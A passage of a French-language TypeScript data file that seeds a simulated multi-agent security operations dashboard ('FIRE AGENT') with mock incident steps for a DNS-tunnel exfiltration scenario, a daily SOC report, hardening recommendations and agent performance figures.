          '[SIMULATION] Capture mémoire du processus émetteur en bac à sable pour analyse forensique',
          '[SIMULATION] Verrouillage des ports non essentiels'
        ],
        technicalData: {
          targetHostIsolated: 'STATION-DEV-04',
          dnsResolutionDropped: true,
          mitigationMode: 'SIMULATION CONTRÔLÉE'
        },
        actionTakenSimulated: 'Résolution DNS du canal C2 coupée et station hôte test isolée logiquement du réseau simulé.',
        durationMs: 1100
      },
      {
        stepNumber: 5,
        agentId: 'verification',
        agentName: 'Agent Vérification',
        phase: 'Audit et contrôle d\'intégrité',
        summary: 'Audit d\'arrêt du flux de données et vérification de l\'étanchéité',
        reasoning: 'Les sondes confirment l\'interruption totale du flux de paquets DNS anormaux et l\'absence de nouveau canal secondaire.',
        details: [
          'Débit de requêtes vers le domaine cible : 0 paquet / s',
          'Vérification des autres stations du réseau : Aucun signe de propagation latérale',
          'Audit d\'intégrité des bases sensibles de test : Non compromises',
          'Confirmation formelle d\'endiguement'
        ],
        technicalData: {
          exfiltrationRate: '0 octet/sec',
          lateralMovementBlocked: true,
          integrityCheck: 'Validé'
        },
        verificationCheck: 'Vérification terminée : Canal d\'exfiltration coupé, aucune fuite résiduelle dans le banc d\'essai.',
        durationMs: 900
      },
      {
        stepNumber: 6,
        agentId: 'chef',
        agentName: 'Chef Agent',
        phase: 'Arbitrage et synthèse exécutive',
        summary: 'Déclenchement de l\'alerte d\'urgence SOC et rédaction du plan de remédiation',
        reasoning: 'L\'incident a mobilisé tous les niveaux de défense. Une alerte prioritaire immédiate est diffusée avec le journal d\'audit complet.',
        details: [
          'Alerte prioritaire simulée diffusée auprès de l\'astreinte de sécurité',
          'Rapport forensique automatique transmis au responsable SOC',
          'Recommandation de durcissement sur l\'inspection DNS',
          'Clôture du dossier INC-2026-X04'
        ],
        technicalData: {
          incidentReference: 'INC-2026-X04',
          totalReactionTime: '4.75s',
          securityEscalation: 'Effectuée'
        },
        durationMs: 900
      }
    ]
  }
];

export const INITIAL_CHEF_REPORT: ChefDailyReport = {
  id: 'RAPPORT-SOC-2026-10-10',
  date: '10 Octobre 2026',
  generatedAt: '10 Octobre 2026 à 10:25 (Heure locale)',
  totalEvents: 428,
  threatsDetected: 47,
  criticalThreats: 6,
  mitigationsExecuted: 38,
  averageResponseTime: '2.14 secondes',
  executiveSummary: 'Au cours des dernières 24 heures d\'exercice au sein du laboratoire de simulation FIRE AGENT, la coordination multi-agents a traité avec succès l\'ensemble des 428 événements générés. 47 scénarios de menaces ont été détectés et qualifiés. 6 menaces critiques ont fait l\'objet d\'une mesure de protection simulée automatique (isolement logique d\'hôte virtuel test, blocage d\'adresses IP et quarantaine de fichiers). Le consensus entre les six agents spécialisés a atteint 99.8%, maintenant une étanchéité absolue vis-à-vis des systèmes réels.',
  keyIncidents: [
    {
      title: 'Scénario Dropper Excel avec macro malveillante polymorphe',
      level: 'Critique',
      resolution: 'Neutralisé en 4.0s par l\'Agent Protection après détection du sous-processus PowerShell.',
      simulatedProtection: 'Quarantaine sandbox et coupure réseau virtuel de l\'hôte test.'
    },
    {
      title: 'Attaque par force brute distribuée avec tentative de saut géographique',
      level: 'Élevé',
      resolution: 'Contenu par l\'Agent Risque et l\'Agent Protection par révocation des jetons de test.',
      simulatedProtection: 'Bannissement temporaire de 14 adresses IP et verrouillage du compte test.'
    },
    {
      title: 'Tentative d\'exfiltration furtive par tunnel DNS sur station R&D de démonstration',
      level: 'Critique',
      resolution: 'Repéré par l\'Agent Détecteur sur base d\'entropie élevée et coupé au niveau du résolveur DNS.',
      simulatedProtection: 'Sinkhole DNS et capture mémoire simulée du processus hôte.'
    }
  ],
  hardeningRecommendations: [
    {
      category: 'Politique de Bureautique',
      priority: 'Critique',
      recommendation: 'Désactivation universelle des macros non signées numériquement dans les suites bureautiques.',
      rationale: '84% des attaques de type vecteur initial dans nos scénarios de test reposent sur l\'exécution de macros VBA non contrôlées.'
    },
    {
      category: 'Gestion des Accès & IAM',
      priority: 'Haute',
      recommendation: 'Application stricte de l\'authentification multifacteur résistante au phishing (FIDO2 / WebAuthn).',
      rationale: 'Prévient les attaques par rejeu de jetons et les sauts géographiques anormaux constatés lors des tests de force brute.'
    },
    {
      category: 'Surveillance Réseau & DNS',
      priority: 'Moyenne',
      recommendation: 'Mise en place d\'une inspection dynamique de l\'entropie des requêtes DNS sur les résolveurs internes.',
      rationale: 'Permet d\'étouffer les canaux d\'exfiltration discrets avant la perte effective de données confidentielles.'
    }
  ],
  agentsPerformance: [
    {
      agentId: 'detecteur',
      agentName: 'Agent Détecteur',
      efficiency: '99.4%',
      status: 'Opérationnel',
      auditStatus: 'Zéro faux négatif sur scénarios connus'
    },
    {
      agentId: 'analyste',
      agentName: 'Agent Analyste',
      efficiency: '98.9%',
      status: 'Opérationnel',
      auditStatus: 'Corrélation IoC rapide (< 1.2s en moyenne)'
    },
    {
      agentId: 'risque',
      agentName: 'Agent Risque',
      efficiency: '99.1%',
      status: 'Opérationnel',
      auditStatus: 'Grille d\'explicabilité 100% documentée'
    },
    {
      agentId: 'protection',
      agentName: 'Agent Protection',
      efficiency: '100%',
      status: 'En attente de consignes',
      auditStatus: 'Strictement cantonné aux actions bac à sable autorisées'
    },
    {
      agentId: 'verification',
      agentName: 'Agent Vérification',
      efficiency: '100%',
      status: 'Opérationnel',
      auditStatus: 'Contrôle d\'intégrité systématique validé'
    },
    {
      agentId: 'chef',
      agentName: 'Chef Agent',
      efficiency: '99.8%',
      status: 'Supervision globale',
      auditStatus: 'Consensus multi-agents unanime et alertes distribuées'
    }
  ]
};
